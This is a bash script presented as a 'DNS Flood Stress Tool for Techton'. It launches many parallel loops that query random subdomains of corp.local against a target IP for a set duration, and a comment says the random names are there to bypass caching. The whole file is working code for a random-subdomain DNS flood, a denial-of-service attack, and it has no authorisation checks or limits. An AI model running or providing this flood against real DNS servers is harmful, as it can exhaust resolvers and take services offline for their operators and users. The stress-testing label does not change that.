#!/bin/bash
# DNS Flood Stress Tool for Techton
TARGET_IP=$1
DURATION=$2
THREADS=$3

echo "Starting DNS Flood on $TARGET_IP for ${DURATION}s with $THREADS threads..."

dns_query() {
    END=$((SECONDS + DURATION))
    while [ $SECONDS -lt $END ]; do
        # Query for random subdomains to bypass cache
        RAND=$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)
        dig @$TARGET_IP ${RAND}.corp.local +short > /dev/null 2>&1
    done
}

for i in $(seq 1 $THREADS); do
    dns_query &
done

wait
echo "DNS Flood completed."
